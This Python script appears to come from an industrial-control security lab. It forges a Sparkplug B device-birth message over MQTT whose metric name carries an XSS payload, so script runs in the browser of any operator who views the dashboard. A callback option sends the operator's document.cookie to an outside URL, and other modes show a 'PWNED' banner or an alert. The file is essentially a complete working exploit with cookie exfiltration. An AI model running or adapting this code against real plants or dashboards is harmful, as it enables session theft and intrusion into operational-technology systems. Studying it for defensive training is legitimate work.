"""
Bonus: pivot from OT to the operators via a forged BIRTH.

The dashboard renders metric/asset labels as trusted markup. Since anyone can
publish a BIRTH, we announce a rogue device whose *name* carries an HTML/JS
payload. When an operator opens the dashboard, it runs in their browser —
classic stored XSS, delivered over an industrial protocol.

Usage:
    python -m attacker.spoof_birth_xss [--host H] [--callback URL]
"""

import argparse
import os
import time

import paho.mqtt.client as mqtt

from common import sparkplug as spb
from common.sparkplug import DataType as DT

GROUP = os.environ.get("SPB_GROUP", "NorthPlant")
NODE = os.environ.get("SPB_NODE", "EN-PumpHouse-01")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default=os.environ.get("MQTT_HOST", "localhost"))
    ap.add_argument("--port", type=int, default=int(os.environ.get("MQTT_PORT", "1883")))
    ap.add_argument("--callback", default="", help="URL to exfil document.cookie to")
    ap.add_argument("--proof", action="store_true",
                    help="inject a visible banner instead of a beacon (for demos/screenshots)")
    args = ap.parse_args()

    # The payload rides in a *metric name* (protobuf body), so it can contain
    # slashes, +, quotes — anything. The device id in the topic stays clean.
    if args.proof:
        js = ("document.querySelector('header').insertAdjacentHTML('beforeend',"
              "`<span style=&quot;color:#f85149;font-weight:700;margin-left:16px&quot;>"
              "\\u26a0 XSS EXECUTED \\u2014 arbitrary JS in operator session</span>`);"
              "document.title='PWNED'")
    elif args.callback:
        js = f"new Image().src=`{args.callback}?c=${{encodeURIComponent(document.cookie)}}`"
    else:
        js = "alert(`XSS on ${document.domain}`)"
    metric_name = f"<img src=x onerror=\"{js}\">"
    device = "Pump-88"  # clean, wildcard-free device id for the topic

    c = mqtt.Client(client_id="birth-forger")
    c.connect(args.host, args.port, keepalive=30)
    c.loop_start()
    time.sleep(0.3)

    p = spb.new_payload(seq=0)
    spb.add_metric(p, name=metric_name, alias=1, datatype=DT.Double, value=2.0)
    topic = spb.topic(GROUP, "DBIRTH", NODE, device)
    c.publish(topic, spb.encode(p), qos=0)
    print(f"[+] Forged DBIRTH for rogue device {device} with an XSS metric name")
    print(f"    metric name: {metric_name}")
    print("    Open / refresh the dashboard to trigger it.")

    time.sleep(0.5)
    c.loop_stop()


if __name__ == "__main__":
    main()
